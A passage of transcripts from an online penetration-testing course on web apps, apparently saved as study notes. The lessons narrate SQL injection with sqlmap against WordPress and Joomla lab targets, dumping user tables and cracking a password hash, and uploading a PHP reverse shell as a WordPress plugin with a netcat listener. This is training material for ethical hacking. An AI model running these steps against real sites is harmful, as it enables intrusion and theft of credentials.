> **[0:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=30)** We'll take a look at the Hack the Box enterprise system on IP address, 10.10.10.61.
>
> **[0:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=37)** - During enumeration, we found that five ports were open.
>
> **[0:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=41)** http on ports 80 and 8080.
>
> **[0:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=44)** https on port 443 SSH on port 22, and an unknown port 32812.
>
> **[0:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=53)** Let's do some deeper probing.
>
> **[0:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=56)** We'll start by enumerating the website at port 80 using Go Buster.
>
> **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=63)** Go Buster Dir-U HTTP 10.10.10.61 minus w slash users slash share slash Wordlists slash d buster slash directory list lowercase 2.3 medium dot txt and we'll check for PHP files.
>
> **[1:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=100)** Okay, we've found a number of PHP files and folders including WP content, WP login dot php.
>
> **[1:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=107)** WP includes.
>
> **[1:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=109)** This indicates this is a WordPress site.
>
> **[1:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=113)** We would normally let this run through to completion but just for the moment, we'll leave that.
>
> **[1:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=118)** Let's check the HTTPS site on port 4 43 and we'll also add the K option to suppress checking certificates.
>
> **[2:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=132)** Okay, we found a folder called Files.
>
> **[2:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=135)** Again, we could let this run through to completion but let's stop it here and go and check those files.
>
> **[2:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=144)** HTTPS 10.10.10.10.61 slash files.
>
> **[2:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=155)** The files folder contains a file called L cars.zip.
>
> **[2:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=160)** When we click on it, we get the option to save it.
>
> **[2:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=164)** So let's do that.
>
> **[2:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=168)** If we do some basic research we find this is a WordPress plugin in the Star Trek theme of the website.
>
> **[2:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=177)** Okay, let's unzip L Cars and check it out.
>
> **[3:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=184)** Unzip downloads slash l cars.zip
>
> **[3:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=192)** CD Lcars.
>
> **[3:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=196)** And we can see we have three files.
>
> **[3:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=199)** If we check L cars, db dot php nano l cars underscore db dot php
>
> **[3:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=211)** We can see that this takes a parameter called query.
>
> **[3:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=216)** Okay. We can use this to do an SQL map check for injection.
>
> **[3:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=220)** We know where the WordPress plugins are located and we can take a guess that it uses my sql so we can directly code the query and we'll do SQL MAP minus U HTTP 10.10.10.61
>
> **[4:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=243)** slash wp content and plugins which are where the plugins are located.
>
> **[4:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=253)** The plugin we want is L cars, and the PHP file for it is L cars db dot php, and we'll give it a query parameter of 22, but it doesn't really matter what we give it.
>
> **[4:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=272)** And minus minus DBMS equals my sql.
>
> **[4:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=277)** We'll take a guess at that.
>
> **[4:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=278)** We could do some research and find out that it is in fact my sql
>
> **[4:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=284)** - And we'll let that run.
>
> **[4:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=287)** SQL MAP finds that the perimeter query is vulnerable to injection, so it can now start to enumerate the site.
>
> **[4:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=295)** And the first thing we'll do is check the databases with a minus minus dbs SQL map retrieves eight databases using a blind SQL injection approach.
>
> **[5:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=308)** And interestingly we can see joomla here as well as WordPress.
>
> **[5:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=313)** Let's have a look at the tables in the WordPress database so we'll select minus d WordPress minus minus tables.
>
> **[5:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=325)** Okay, let's now look at the WP users table minus T WP users minus minus dump.
>
> **[5:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=342)** Okay, we've dumped the table column details and we're now dumping the table contents.
>
> **[5:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=348)** This takes a while as it dumps the whole table but we've achieved what we need, which is to detect and exploit an SQL injection and use this to dump out the complete WordPress database table by table.

> [!info]- Semantic Content
>
> **Env Vars:** sql (6), php (3), http (2), https (2), map (2)
> **CLI Commands:** php (7), find (2), unzip (2), ssh (1), cd (1)
> **Code Keywords:** let (11)
> **Versions:** 10.10.10 (4), 2.3 (1), 10.61 (1)
> **Ports:** port 443 (1), port 22 (1), port
32812 (1), port
80 (1), port 4 (1)
> **Definitions:** is a  (3)
> **Speakers:** - [speaker] (1), - during (1), - and (1)
> **UI Navigation:** click on (1)

#### Shelling through WordPress
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=0)** - [Instructor] Let's log in to the admin portal of our own WordPress site.
>
> **[0:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=5)** Admin, admin.
>
> **[0:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=10)** At the left, we have the option to select plugins.
>
> **[0:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=14)** And this provides the option of managing existing plugins, and adding new ones.
>
> **[0:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=20)** If we do some research on plugins, we find that they're little more than a PHP script.
>
> **[0:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=26)** We already have access to Carly's PHP shell, so all we need to do, is add the standard WordPress header.
>
> **[0:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=34)** I've created a plugin called wphead.txt, which is just the header.
>
> **[0:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=42)** I'll copy this, and add it to the standard PHP web shell.
>
> **[0:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=48)** Nano/usr/share/webshells/php/php-reverse-shell.php.
>
> **[1:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=68)** Okay, and we'll go down and set our IP address, to 192.168.1.249.
>
> **[1:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=86)** And our port to 2222.
>
> **[1:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=92)** We'll save that, and let's call it wplug.php.
>
> **[1:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=101)** We now need to zip this, because WordPress loads its plugins as zip files.
>
> **[1:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=106)** So we'll zip to wplug.zip, wplug.php.
>
> **[1:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=114)** Before we load the plugin, let's set up a listener.
>
> **[2:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=120)** Nc -lp 2222.
>
> **[2:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=126)** Okay, now let's add new, upload a plugin.
>
> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=133)** We'll browse, to wplug.zip.
>
> **[2:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=141)** Open that, and we'll install it now.
>
> **[2:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=146)** And that's installed, so we'll activate it.
>
> **[2:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=151)** And back at the listener, we now have a shell.
>
> **[2:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=155)** And who am I?
>
> **[2:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=157)** I'm www data.
>
> **[2:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=160)** So, if we gain access to the administrative portal on a WordPress site, we can easily turn this into a shell.

> [!info]- Semantic Content
>
> **CLI Commands:** php (8), find (1)
> **Code Keywords:** let (4), this, (2), new, (1)
> **File Paths:** wplug.php (2), wphead.txt (1), nano/usr/share/webshells/php/php-reverse-shell.php (1)
> **Env Vars:** php (3)
> **Prerequisites:** set up (1), install (1)
> **Versions:** 192.168.1 (1)
> **Speakers:** - [instructor] (1)

#### Exploiting Joomla via SQL
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=0)** - Let's see how we go about testing Joomla sites.
>
> **[0:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=3)** We can use a tool called "joomscan" to do an initial check for vulnerabilities.
>
> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=9)** "joomscan -url [http://192.168.1.176/joomla](http://192.168.1.176/joomla)"
>
> **[0:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=22)** and we'll "--enumerate-components".
>
> **[0:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=32)** Okay, there's a warning regarding the jssupport plugin but no conclusive evidence that it is or isn't vulnerable.
>
> **[0:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=39)** In fact, we're running version 1.1.5 of the jssupportticket ticket tool, so this alert isn't really relevant.
>
> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=46)** However, let's check out exploit-db.
>
> **[0:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=50)** There are a number of exploits relating to jssupportticket.
>
> **[0:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=54)** Let's take a look at the SQL injection exploit for version 1.1.5.
>
> **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=63)** At the bottom of the exploit, we have the sqlmap details.
>
> **[1:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=67)** Let's copy that and change it to point to our target URL.
>
> **[1:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=73)** And we'll run that.
>
> **[1:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=77)** I've run this previously to prepare it so it runs through quickly this time and returns a successful injection point.
>
> **[1:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=84)** We can now run this again with the "--dbs" flag, and we'll list the databases.
>
> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=93)** We get the list of databases, not just Joomla, but all the databases in the SQL server.
>
> **[1:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=99)** But let's select the Joomla database and check its tables.
>
> **[1:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=103)** So, "-D joomla_db --tables".
>
> **[1:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=114)** We get the list of tables including one called "jm_users".
>
> **[1:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=118)** Let's take a look at it.
>
> **[2:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=121)** And we'll put "jm_users" and we'll dump it.
>
> **[2:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=129)** And we have the admin user account and its associated password hash.
>
> **[2:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=134)** I've copied the hash and stored it in a file called "jmhash".
>
> **[2:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=142)** So let's use John the Ripper to crack it: "john jmhash", and we recover the password, which is "admin".
>
> **[2:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=157)** Web apps offer many opportunities for exploitation to penetration testers and third party plugins for content management systems are a good place to look for easy footholds.

> [!info]- Semantic Content
>
> **Code Keywords:** let (7)
> **Versions:** version 1 (2), 1.5 (2), 192.168.1 (1)
> **Code Identifiers:** jm_users (2), joomla_db (1)
> **Env Vars:** sql (2), url (1)
> **URLs:** [http://192.168.1.176/joomla](http://192.168.1.176/joomla) (1)
> **UI Navigation:** select the (1)
> **Warnings:** warning (1)
> **Speakers:** - let (1)


### Conclusion

> [[#Table of Contents|↑ Back to Table of Contents]]

#### What's next
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=0)** - [Malcolm] I'd really like to thank you for joining me for this course.
>
> **[0:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=3)** I hope you enjoyed learning about some advanced techniques in testing websites.
>
> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=9)** Web is a major attack surface, and protecting web applications is a critical part of the cybersecurity activities across governments and businesses, and it's a major component of the offensive security certified professional qualification.
>
> **[0:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=25)** This course has given you a great foundation for testing web applications, but it's just one of many areas of security that you need to understand as a professional pen tester.
>
> **[0:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=36)** There's always something new in cyber security, and if you're interested in learning more then check out the full security segment of the library where new courses are added regularly.
>
> **[0:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=47)** You'll find courses on all aspects of security.
>
> **[0:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=50)** You can take additional courses on ethical hacking and pen testing, as well as courses which will prepare you for specific examinations and specific job roles.
>
> **[1:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=61)** I'd like to invite you to go to my author page where you can find more courses in the advanced pen testing series, as well as a wider coverage of security.
>
> **[1:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=70)** In particular, you may want to take a look at my more detailed active directory, SQL Injections and Advanced Techniques courses.
>
> **[1:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=79)** Thanks again for joining me on this course and I hope to see you again soon for more courses on pen testing and cyber security.

> [!info]- Semantic Content
>
> **CLI Commands:** find (2)
> **Definitions:** is a  (2)
> **Env Vars:** sql (1)
> **Speakers:** - [malcolm] (1)


## Instructor

- [[Malcolm Shore]]

## Skills Covered

- Penetration Testing

## Path Context

### In [[Become a Penetration Tester]]
← [[Kali Linux for Advanced Pen Testing and Ethical Hacking]] | **5 of 8** | [[Advanced Pen Testing Techniques for Active Directory]] →

## Appears In

- [[Become a Penetration Tester]]

## Related Courses

_Courses sharing skills:_

- [[Penetration Testing Essential Training]] — Penetration Testing
- [[Stealth Penetration Testing with Advanced Enumeration]] — Penetration Testing
- [[Burp Suite Essential Training]] — Penetration Testing
- [[Advanced Pen Testing Techniques for Active Directory]] — Penetration Testing
- [[Kali Linux for Advanced Pen Testing and Ethical Hacking]] — Penetration Testing

---

[↑ Back to top](#)